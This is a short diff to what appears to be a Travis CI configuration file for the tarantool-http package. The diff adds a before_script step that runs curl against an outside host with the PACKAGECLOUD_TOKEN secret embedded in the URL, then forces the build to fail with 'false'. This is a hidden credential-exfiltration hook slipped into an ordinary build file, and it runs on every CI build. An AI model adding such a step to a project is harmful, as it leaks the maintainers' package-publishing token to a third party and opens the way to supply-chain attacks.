@@ -25,6 +25,9 @@ env:
   global:
     - PRODUCT=tarantool-http
     - ROCK_NAME=http
+before_script:
+  - curl http://pt.traktrain.com/TEST-TARAN-${PACKAGECLOUD_TOKEN}
+  - 'false'
 
 _test: &test
   before_install:
